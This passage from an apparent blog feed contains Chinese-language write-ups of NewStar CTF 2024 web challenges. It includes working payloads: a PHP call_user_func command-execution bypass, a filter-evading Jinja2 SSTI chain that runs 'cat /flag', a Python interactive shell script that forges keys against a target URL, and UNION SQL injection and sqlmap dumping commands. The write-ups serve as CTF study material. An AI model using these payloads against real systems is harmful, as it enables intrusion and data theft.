class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/ event/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;点击此处载入存档&#x27;</span>, <span class="hljs-variable">$msg</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show_backdoor</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;/assets/index.4f73d116116831ef.js&#x27;</span>, <span class="hljs-string">&#x27;/assets/backdoor.5b55c904b31db48d.js&#x27;</span>, <span class="hljs-variable">$content</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><br><span class="hljs-comment"># Backdoor</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;papa&#x27;</span>] !== <span class="hljs-string">&#x27;TfflxoU0ry7c&#x27;</span>) &#123;<br>    <span class="hljs-title function_ invoke__">show_backdoor</span>();<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>] !== <span class="hljs-string">&#x27;Welcome&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^Welcome$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;NewStar_CTF.2024&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai loves you!&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;args&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">print_msg</span>(<span class="hljs-string">&#x27;PangBai hates you!&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>主要看<code>if ($_POST[&#39;papa&#39;] !== &#39;TfflxoU0ry7c&#39;)</code>和<code>else if ($_GET[&#39;NewStar_CTF.2024&#39;] !== &#39;Welcome&#39; &amp;&amp; preg_match(&#39;/^Welcome$/&#39;, $_GET[&#39;NewStar_CTF.2024&#39;]))</code></p><p>在上面的代码中，正则表达式 <code>&#39;/^Welcome$/&#39;</code> 要求精确匹配 <code>&quot;Welcome&quot;</code>，而 <code>^</code> 和 <code>$</code> 分别匹配字符串的开头和结尾。由于 <code>$</code> 在单行模式下会将最后一个换行符视为字符串结尾，<strong>可以通过在 <code>Welcome</code> 后添加换行符</strong>来绕过这种检查。</p><p>因此，通过在 <code>$_GET[&#39;NewStar_CTF.2024&#39;]</code> 中添加换行符，攻击者可以在一些情况下绕过原本精确匹配的验证逻辑，从而让条件语句的判断意图失效。</p><p>但如果直接传参 <code>NewStar_CTF.2024=Welcome%0A</code> 会发现并没有用。这是由 <code>NewStar_CTF.2024</code> 中的特殊字符 <code>.</code> 引起的，PHP 默认会将其解析为 <code>NewStar_CTF_2024</code>.</p><p>在 PHP 7 中，可以使用 <code>[</code> 字符的非正确替换漏洞。当传入的参数名中出现 <code>[</code> 且之后没有 <code>]</code> 时，PHP 会将 <code>[</code> 替换为 <code>_</code></p><p>因此，GET 传参 <code>NewStar[CTF.2024=Welcome%0A</code>即可。</p><p>之后就是对call_user_func的利用：<br>由于 <code>$_POST[&#39;func&#39;]</code> 和 <code>$_POST[&#39;args&#39;]</code> 都是用户可控的输入，代码中没有进行任何验证或过滤，这种用法可能导致<strong>任意代码执行漏洞</strong>。用户可以通过向 <code>func</code> 传入 PHP 内置的敏感函数名称，或者指定某些自定义函数，实现执行任意代码的目的。例如：</p><ul><li>用户传入 <code>$_POST[&#39;func&#39;] = &#39;system&#39;</code> 和 <code>$_POST[&#39;args&#39;] = &#39;ls&#39;</code>，则会执行 <code>system(&#39;ls&#39;)</code>，从而在服务器上执行命令。</li></ul><p><img src="/../images/Pasted%20image%2020241029164857.png"></p><p><code>env | grep flag</code> 是一个命令行指令，通常用于查找包含关键字“flag”的环境变量。</p><ol><li>**<code>env</code>**：列出当前 shell 中的所有环境变量及其值。</li><li><strong><code>|</code>（管道符）</strong>：将前一个命令的输出传递给后一个命令。</li><li>**<code>grep flag</code>**：过滤 <code>env</code> 命令的输出，仅显示包含“flag”关键字的行。</li></ol><h1 id="复读机"><a href="#复读机" class="headerlink" title="复读机"></a>复读机</h1><p>SSTI（Server-Side Template Injection）注入: 发生在一些服务器端使用的模板引擎（如 Jinja2、Twig、Thymeleaf 等）中，允许攻击者在模板中注入并执行恶意代码。</p><p>漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。凡是使用模板的地方都可能会出现 SSTI 的问题</p><p><strong><a href="http://f0und.icu/article/24.html">http://f0und.icu/article/24.html</a></strong></p><p><strong><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园</a></strong></p><p>目前CTF常见的SSTI题中，大部分是考python的。python常见的模板有：Jinja2，tornado.</p><p>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了 <strong></strong> 块</p><p>由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作，比如文件读取，命令执行等。</p><p>Python 中的对象带有许多特殊的 <code>__dunder__</code> 属性（也称为“魔术方法”），例如 <code>__class__</code>、<code>__dict__</code> 和 <code>__mro__</code>，它们提供了关于对象类型和结构的详细信息。</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-emphasis">__class__</span>:获得当前对象的类 # print(person.<span class="hljs-emphasis">__class__</span>)<br><span class="hljs-emphasis">__bases__</span>:只显示直接基类，适合用于查看当前类的直接父类。<br><span class="hljs-emphasis">__mro__</span> :给出一个完整的类继承链，适用于多重继承情况下的查找顺序。<br><span class="hljs-emphasis">__subclasses__</span>()：返回子类列表<br><span class="hljs-emphasis">__init__</span> 类的初始化方法 <br><span class="hljs-emphasis">__globals__</span> 对包含函数全局变量的字典的引用<br></code></pre></td></tr></table></figure><p>获取 <code>object</code> 类。</p><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf"><span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro___</span> <span class="hljs-comment">// 会获取当前的方法的调用顺序</span><br></code></pre></td></tr></table></figure><p>在 Python 中，<code>object</code> 类是所有类的基类，为每个类和对象提供了基础结构，如 <code>__str__</code>、<code>__repr__</code>、<code>__init__</code> 等常用方法，这些方法被所有类继承或重写。这使得不同类型的对象之间能够保持一致的行为，并且方便实现多态性。</p><p>python3:  <code>str.__mro__</code> 会返回 <code>(&lt;class &#39;str&#39;&gt;, &lt;class &#39;object&#39;&gt;)</code><br>python2：<code>str.__mro__</code> 会返回<code>(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</code></p><p>所以 python3 <code>object</code> 类是<code>&quot;a&quot;.__class__.__mro___[1]</code>。</p><p>找到<code>object</code> 类后，<code>.__subclasses__()</code>返回其子类列表。</p><figure class="highlight sqf"><table><tr><td class="code"><pre><code class="hljs sqf"><span class="hljs-string">&quot;a&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro___</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()<br></code></pre></td></tr></table></figure><p>Python 中存在一些具有全局字典引用（如 <code>__globals__</code>）的类，这些类的 <code>__init__</code> 方法会包含对全局字典的引用，从而能通过反射或属性访问来找到 <code>eval</code>。<strong>如awnings,enum等类</strong>。</p><p><code>eval</code> 是 Python 中的一个内置函数，用于<strong>动态执行</strong>表达式字符串，并返回结果。</p><p>由于 <code>eval</code> 可以执行任意代码，<strong>它有较高的安全风险</strong>。例如，如果用户输入了具有破坏性的代码，<code>eval</code> 将会无条件执行。因此，只有在确保安全的情况下才应使用 <code>eval</code>，并尽可能避免直接暴露给用户输入。</p><p>通常情况下，<code>eval</code> 是直接可以从 <code>__builtins__</code> 访问的。<code>__builtins__</code> 是 Python 的全局命名空间中的一个字典，包含了所有内置函数、异常和对象。</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 从 __builtins__ 中访问 eval</span><br>eval_func = __builtins__[<span class="hljs-string">&#x27;eval&#x27;</span>]<br><span class="hljs-built_in">result</span> = eval_func(<span class="hljs-string">&quot;5 + 10&quot;</span>)<br>print(<span class="hljs-built_in">result</span>)  <span class="hljs-comment"># 输出 15</span><br></code></pre></td></tr></table></figure><p>在一些受限制的环境中，可能无法直接访问 <code>eval</code>，需要通过反射或其他方式获取。例如，可以通过获取某些内置类型的 <code>__init__</code> 方法中的 <code>__globals__</code> 字典来间接访问 <code>eval</code>：</p><figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta"><span class="hljs-meta"># 间接获取 eval</span><br>eval_func = <span class="hljs-built_in">int</span>.__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>]<br>result = eval_func(<span class="hljs-string">&quot;7 * 3&quot;</span>)<br><span class="hljs-keyword">print</span>(result)  <span class="hljs-meta"># 输出 21</span><br></code></pre></td></tr></table></figure><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="1-确定注入点是否存在-SSTI"><a href="#1-确定注入点是否存在-SSTI" class="headerlink" title="1. 确定注入点是否存在 SSTI"></a>1. 确定注入点是否存在 SSTI</h3><ul><li>在接触页面时，先尝试注入简单的模板表达式，比如 <code>&#123;&#123; 7*7 &#125;&#125;</code>，观察页面是否直接返回表达式结果。</li><li>正常情况下，用户输入应当被视为普通文本，不应执行其中的任何代码。如果输入 <code>&#123;&#123; 7*7 &#125;&#125;</code> 被解析为 <code>49</code>，说明服务器将输入当成了代码，而不是普通文本，就说明该页面存在 SSTI 注入，可以通过模板语法进一步探索。</li></ul><h3 id="2-探索过滤规则"><a href="#2-探索过滤规则" class="headerlink" title="2. 探索过滤规则"></a>2. 探索过滤规则</h3><ul><li>尝试注入 <code>&#123;&#123; "a".__class__&#125;&#125;</code> 来获取当前对象的类。页面输出异常信息（“bot 显示不喜欢上课”），说明 <code>__class__</code> 被过滤，<code>.</code> 可能也会被视为敏感字符，因为它能直接访问对象的属性。</li><li>遇到关键字被过滤的情况，可以利用字符串拼接等技巧绕过过滤，例如 <code>&#123;&#123;"a"['__cl'+'ass__']&#125;&#125;</code>，绕过 <code>__class__</code> 关键字限制。其中用<code>[]</code> 来绕过<code>.</code>过滤<br><img src="/../images/Pasted%20image%2020241029221640.png"></li></ul><h3 id="3-利用-SSTI-获取敏感对象和方法"><a href="#3-利用-SSTI-获取敏感对象和方法" class="headerlink" title="3. 利用 SSTI 获取敏感对象和方法"></a>3. 利用 SSTI 获取敏感对象和方法</h3><ul><li>SSTI 的目的是执行服务端代码，所以我们需要找到一个能操作系统命令的类。</li><li>对于大多数语言，<code>object</code> 是所有类的基类，我们可以通过访问 <code>object</code> 来找到各种可能的类。</li><li>可以通过表达式 <code>&#123;&#123;"a".['__cl'+'ass__']['__mro__'][1]&#125;&#125;</code>获取 <code>object</code> 类；<br><img src="/../images/Pasted%20image%2020241029222218.png"></li><li>然后通过 <code>&#123;&#123;"a".['__cl'+'ass__']['__mro__'][1]['__subc'+'lasses__']()&#125;&#125;</code> 获得所有子类的列表。<br><img src="/../images/Pasted%20image%2020241029222419.png"></li></ul><h3 id="4-查找可利用的类"><a href="#4-查找可利用的类" class="headerlink" title="4. 查找可利用的类"></a>4. 查找可利用的类</h3><ul><li>在获得 <code>subclasses()</code> 列表后，可以遍历其中的类，找到可能用于执行命令的类。在这个例子中，可以选择 <code>os._wrap_close</code>（通常位于索引 132，不同的 Python 版本和环境中，索引值可能有所不同）类。</li><li><code>os._wrap_close</code> 类中包含了可以帮助调用系统命令的方法，比如 <code>__init__</code> 中可以访问 <code>__globals__</code> 属性，进一步获取 Python 内置的 <code>eval</code> 函数。</li></ul><h3 id="5-利用-eval-执行系统命令"><a href="#5-利用-eval-执行系统命令" class="headerlink" title="5. 利用 eval 执行系统命令"></a>5. 利用 <code>eval</code> 执行系统命令</h3><ul><li>通过 <code>eval</code>，可以构造命令执行的表达式：<figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss">&#123;&#123;&quot;<span class="hljs-selector-tag">a</span>&quot;.<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__mro__&#x27;</span>]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__subc&#x27;</span>+<span class="hljs-string">&#x27;lasses__&#x27;</span>]</span>()<span class="hljs-selector-attr">[132]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__init__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__globals__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;__builtins__&#x27;</span>]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;eval&#x27;</span>]</span>(&quot;__import__(&#x27;os&#x27;)<span class="hljs-selector-class">.popen</span>(&#x27;cat /flag&#x27;)<span class="hljs-selector-class">.read</span>()&quot;)&#125;&#125;<br></code></pre></td></tr></table></figure></li><li>**<code>__import__(&#39;os&#39;)</code>**：导入 Python 的 <code>os</code> 模块。<code>__import__()</code> 是一个内置函数，可以用来动态导入模块。</li><li>**<code>os.popen(&#39;cat /flag&#39;)</code>**：调用 <code>os.popen()</code>，它打开一个管道并执行命令 <code>cat /flag</code>。</li><li>**<code>.read()</code>**：将执行命令的结果读出并返回。<br><img src="/../images/Pasted%20image%2020241029223458.png"></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;你能在一秒内打出八句英文吗&quot;&gt;&lt;a href=&quot;#你能在一秒内打出八句英文吗&quot; class=&quot;headerlink&quot; title=&quot;你能在一秒内打出八句英文吗&quot;&gt;&lt;/a&gt;你能在一秒内打出八句英文吗&lt;/h1&gt;&lt;p&gt;经典脚本题，思路：先获取页面中需要输入的英文文本，再</summary>
      
    
    
    
    
    <category term="CTF刷题记录" scheme="http://example.com/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>NewStar-CTF-2024-Week1-Web</title>
    <link href="http://example.com/2024/10/25/NewStar-CTF-2024-Week1-Web/"/>
    <id>http://example.com/2024/10/25/NewStar-CTF-2024-Week1-Web/</id>
    <published>2024-10-25T12:12:43.000Z</published>
    <updated>2024-12-09T08:33:29.281Z</updated>
    
    <content type="html"><![CDATA[<h1 id="headach3"><a href="#headach3" class="headerlink" title="headach3"></a>headach3</h1><p><img src="/../images/Pasted%20image%2020241026130512.png"></p><h1 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h1><p><img src="/../images/Pasted%20image%2020241026132418.png"><br>ZmxhZ3tXQTB3<br><img src="/../images/Pasted%20image%2020241026133308.png"></p><p>控制台是开发者调试 JavaScript 代码的利器，允许开发者在无需修改源代码的情况下，直接执行和测试代码。</p><p>在 <code>revealFlag</code> 函数中，如果请求成功并得到了包含 <code>flag</code> 和 <code>nextLevel</code> 的数据，控制台会输出成功信息。</p><p><img src="/../images/Pasted%20image%2020241026134951.png"><br>IV95NF9yM2Fs<br><img src="/../images/Pasted%20image%2020241026135811.png"><br><img src="/../images/Pasted%20image%2020241026140155.png"></p><p><img src="/../images/Pasted%20image%2020241026141045.png"><br><img src="/../images/Pasted%20image%2020241026143039.png"><br>MXlfR3I0c1B<br><img src="/../images/Pasted%20image%2020241026144531.png">在这段代码中，<code>&lt;noscript&gt;</code> 标签及其包含的内容会在用户的浏览器<strong>禁用 JavaScript 时显示</strong>，确保即使 JavaScript 不可用，页面仍然提供表单提交功能。<br><img src="/../images/Pasted%20image%2020241026145033.png"><img src="/../images/Pasted%20image%2020241026145054.png">拼接：ZmxhZ3tXQTB3IV95NF9yM2FsMXlfR3I0c1BfSkpKcyF9<br><img src="/../images/Pasted%20image%2020241026145455.png"></p><h1 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h1><p><img src="/../images/Pasted%20image%2020241026160430.png"><br>提示：robots</p><p><img src="/../images/Pasted%20image%2020241026160534.png"><br><img src="/../images/Pasted%20image%2020241026160654.png"><img src="/../images/Pasted%20image%2020241026160752.png"><br>这道题目是一个经典的 CTF Web 题，考察对 <strong>加密反转逻辑</strong> 和 <strong>命令执行漏洞</strong> 的理解。<br>命令执行漏洞的核心在于应用程序没有对用户输入进行充分的验证和过滤，导致恶意输入被当作系统命令执行。<br>遇到这类 CTF 题目，通常解题的思路可以分为几个主要步骤：</p><h3 id="1-理解题目需求和源码逻辑"><a href="#1-理解题目需求和源码逻辑" class="headerlink" title="1. 理解题目需求和源码逻辑"></a>1. <strong>理解题目需求和源码逻辑</strong></h3><ul><li>仔细阅读代码，分析参数的使用和处理方式。弄清每个函数的功能，特别是涉及到加密、编码、解码、字符串处理等操作。</li><li>理解执行路径，尤其是检查条件、校验机制和函数调用的顺序。分析 PHP 代码会发现，传入的 <code>cmd</code> 和 <code>key</code> 被经过一系列操作校验后执行，说明这是一种通过参数构造绕过校验的题型。</li></ul><h3 id="2-明确绕过校验的目标"><a href="#2-明确绕过校验的目标" class="headerlink" title="2. 明确绕过校验的目标"></a>2. <strong>明确绕过校验的目标</strong></h3><ul><li>此类题型通常需要绕过校验逻辑。目标是：使服务端接收合法的 <code>cmd</code> 参数，通过 <code>key</code> 校验后执行。</li><li>分析加密或哈希校验逻辑，明确需要构造怎样的 <code>cmd</code> 和 <code>key</code> 才能满足条件。</li></ul><h3 id="3-逆向构造加密或校验逻辑"><a href="#3-逆向构造加密或校验逻辑" class="headerlink" title="3. 逆向构造加密或校验逻辑"></a>3. <strong>逆向构造加密或校验逻辑</strong></h3><ul><li>找出 <code>cmd</code> 的加密或编码方式。通常，这类题目会使用某种对称或反转的编码，PHP 代码中涉及 <strong>Base64 编码</strong>、<strong>字符串反转</strong> 和 <strong>MD5 哈希</strong>。</li><li>根据服务器端的逻辑（例如加密顺序：Base64 编码 → 反转 → MD5），在本地复现同样的加密顺序。将用户输入的命令进行同样的处理，从而生成合法的 <code>key</code>。</li></ul><h3 id="4-编写脚本模拟请求"><a href="#4-编写脚本模拟请求" class="headerlink" title="4. 编写脚本模拟请求"></a>4. <strong>编写脚本模拟请求</strong></h3><ul><li>根据上述逻辑，编写脚本构造合法的 <code>cmd</code> 和 <code>key</code>，并发送请求。</li><li>在脚本中执行多轮交互，便于测试不同的命令，并获得反馈。</li></ul><h3 id="5-验证并进行测试"><a href="#5-验证并进行测试" class="headerlink" title="5. 验证并进行测试"></a>5. <strong>验证并进行测试</strong></h3><ul><li>执行一些简单命令（如 <code>hostname</code> 或 <code>whoami</code>）测试是否成功。</li><li>如果返回成功的结果，就可以继续发送其他命令并探索题目环境。</li></ul><h3 id="常见思路和技巧总结"><a href="#常见思路和技巧总结" class="headerlink" title="常见思路和技巧总结"></a>常见思路和技巧总结</h3><ul><li><strong>理解加密与编码顺序</strong>：加密题通常包含加密、编码和顺序反转等，梳理清楚顺序是关键。</li><li><strong>复现服务器端逻辑</strong>：本地复现加密流程，用脚本自动化操作，减少错误。</li><li><strong>构造恶意输入</strong>：这类题目常涉及构造合适的参数绕过校验，生成带有效 <code>key</code> 的合法请求。</li><li><strong>调试与测试</strong>：可以使用简单命令，如 <code>ls</code>、<code>pwd</code> 等，验证自己是否成功执行命令。</li></ul><p>编写自动化脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests <span class="hljs-comment"># 发送 HTTP 请求</span><br><span class="hljs-keyword">import</span> base64 <span class="hljs-comment"># base64编码和解码</span><br><span class="hljs-keyword">import</span> hashlib <span class="hljs-comment"># 生成哈希值</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Shell for newstar_zhixieweiji&quot;</span>)<br>url = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] Enter the target URL: &quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_cmd</span>(<span class="hljs-params">cmd</span>):<br>    cmd_encoded = base64.b64encode(cmd.encode()).decode()<br>    <span class="hljs-comment"># 由 php 代码可知，cmd 是一个 Base64 编码后的命令</span><br>    <span class="hljs-comment"># 先将 cmd 编码为字节，确保在处理不同字符集时，命令的内容可以被正确处理</span><br>    <span class="hljs-comment"># 然后进行 Base64 编码</span><br>    <span class="hljs-comment"># 最后解码为字符串(为反转做准备)</span><br>    cmd_reversed = cmd_encoded[::-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 切片，倒序</span><br>    hashed_reversed_cmd = hashlib.md5(cmd_reversed.encode()).hexdigest()<br>    encoded_key = base64.b64encode(hashed_reversed_cmd.encode()).decode()<br>    <span class="hljs-comment"># 生成满足后端验证的 key</span><br>    payload = &#123;<span class="hljs-string">&#x27;cmd&#x27;</span>: cmd_encoded, <span class="hljs-string">&#x27;key&#x27;</span>: encoded_key&#125;<br>    response = requests.post(url, data = payload)<br>    <span class="hljs-keyword">return</span> response.text[:-<span class="hljs-number">1</span>] <span class="hljs-comment"># 去掉最后一个字符（可能是换行符或其他）</span><br><br>hostname = execute_cmd(<span class="hljs-string">&quot;hostname&quot;</span>)<br>username = execute_cmd(<span class="hljs-string">&quot;whoami&quot;</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    directory = execute_cmd(<span class="hljs-string">&quot;pwd&quot;</span>)<br>    <span class="hljs-comment"># 获取当前工作目录</span><br>    command = <span class="hljs-built_in">input</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;username&#125;</span>@<span class="hljs-subst">&#123;hostname&#125;</span>:<span class="hljs-subst">&#123;directory&#125;</span>$ &quot;</span>)<br>    <span class="hljs-comment"># 三个变量的值插入到字符串中对应的位置</span><br>    output = execute_cmd(command)<br>    <span class="hljs-built_in">print</span>(output)<br></code></pre></td></tr></table></figure><p>在CTF环境中，执行 <code>cat /flag</code> 是常见的读取 flag 文件的方式。</p><p><img src="/../images/Pasted%20image%2020241026203303.png"></p><h1 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h1><h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><ol><li><p>首先判断是数字型注入还是字符型注入。<br>输入<code>1 and 1=1</code>和<code>1 and 1=2</code><br>如果是数字型，第一种有回显，第二种无回显。<br>如果是字符型，由于sql特性，遇到非数字字符时停止，所以两种都有回显。<br>由此判断，题目是数字型注入。</p></li><li><p>判断字段数 order by，发现有两个字段</p></li><li><p>爆数据库，版本，异常值+union<br> -1 union select database(),version()<br><img src="/../images/Pasted%20image%2020241026223402.png"></p></li><li><p>爆表<br>-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’ctf’<br><img src="/../images/Pasted%20image%2020241026214848.png"></p></li><li><p>爆字段<br>-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;’ctf’ and table_name&#x3D;’Fl4g’<br><img src="/../images/Pasted%20image%2020241026215509.png"></p></li><li><p>查看信息<br>-1 union select id,group_concat(id,des,value) from Fl4g<br><img src="/../images/Pasted%20image%2020241026215319.png"></p></li></ol><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><ol><li>get 请求: python sqlmap.py -u <a href="http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1">http://127.0.0.1/DVWA-master/vulnerabilities/sqli/?id=1</a></li><li>post 请求：burpsuite抓包，把请求包保存到文档中。<br>Windows：python sqlmap.py<br>Linux：sqlmap<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 是否存在注入点</span><br><span class="hljs-attribute">sqlmap</span> -r “请求包路径”<br></code></pre></td></tr></table></figure></li></ol><figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment"># 获取注入点所有数据库</span><br>sqlmap -r “请求包路径” <span class="hljs-comment">--dbs</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"># 获取当前使用的数据库<br>sqlmap -<span class="hljs-attribute">r</span> “请求包路径” <span class="hljs-attr">--current-db</span> <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"># 获取数据库中的表<br>sqlmap -<span class="hljs-attribute">r</span> “请求包路径” <span class="hljs-attr">--table</span> -D “数据库名” <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"># 获取表中的字段信息<br>sqlmap -<span class="hljs-attribute">r</span> “请求包路径” <span class="hljs-attr">--columns</span> -T “表名” -D “获取的数据库名” <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><figure class="highlight scss"><table><tr><td class="code"><pre><code class="hljs scss"># 获取字段具体信息<br>sqlmap -<span class="hljs-attribute">r</span> “请求包路径” <span class="hljs-attr">--dump</span> -C “字段名(可多个，逗号隔开)” -T “表名” -D “数据库名” <span class="hljs-attr">--batch</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出所有使用过的账户</span><br>sqlmap -r “请求包路径” –<span class="hljs-built_in">users</span><br></code></pre></td></tr></table></figure><h1 id="PangBai-过家家（1）"><a href="#PangBai-过家家（1）" class="headerlink" title="PangBai 过家家（1）"></a>PangBai 过家家（1）</h1><p><img src="/../images/Pasted%20image%2020241027122630.png"><br><img src="/../images/Pasted%20image%2020241027123301.png"><br><img src="/../images/Pasted%20image%2020241027123346.png"></p><p>「Query」指的就是 GET 请求的请求参数</p><p><img src="/../images/Pasted%20image%2020241027123711.png"><br><img src="/../images/Pasted%20image%2020241028185526.png"></p><p>再次execute</p><p><img src="/../images/Pasted%20image%2020241028211213.png"></p><p><code>User-Agent</code> 必须按照标准格式填写（参见 <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent">User-Agent - HTTP | MDN</a>）</p><p><img src="/../images/Pasted%20image%2020241028221554.png"></p><p>HTTP 协议对请求数据的格式有要求，尤其在发送非 ASCII 字符时（如中文），这些字符通常需要进行 URL 编码。</p><p><img src="/../images/Pasted%20image%2020241028222536.png"></p><p>HackBar 会自动处理中文的转义:</p><p><img src="/../images/Pasted%20image%2020241028222916.png"><br><img src="/../images/Pasted%20image%2020241028223517.png"></p><p><code>PATCH</code> 是一种用于 <strong>部分更新资源</strong> 的 HTTP 请求方法。与 <code>PUT</code> 方法不同，<code>PATCH</code> 只用于修改资源中的特定字段或属性，而不是替换整个资源。</p><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设有一个 API，用于存储用户信息，用户信息结构如下：</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br>  <span class="hljs-string">&quot;user_id&quot;</span>: <span class="hljs-number">123</span>,<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;john_doe&quot;</span>,<br>  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;john<span class="hljs-variable">@example</span>.com&quot;</span>,<br>  <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">25</span><br>&#125;<br></code></pre></td></tr></table></figure><p>现在，只想更新 <code>email</code> 字段，可以使用 <code>PATCH</code> 方法，而不必传输整个用户数据：</p><h4 id="请求示例"><a href="#请求示例" class="headerlink" title="请求示例"></a>请求示例</h4><figure class="highlight http"><table><tr><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PATCH</span> <span class="hljs-string">/users/123</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>api.example.com<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-perl">&#123;</span><br><span class="language-perl">  <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;new_email<span class="hljs-variable">@example</span>.com&quot;</span></span><br><span class="language-perl">&#125;</span><br></code></pre></td></tr></table></figure><p>这个请求会只更新用户的 <code>email</code> 字段，其他字段保持不变。</p><p>本题需要使用 <code>Content-Type: multipart/form-data</code> 发包。</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" 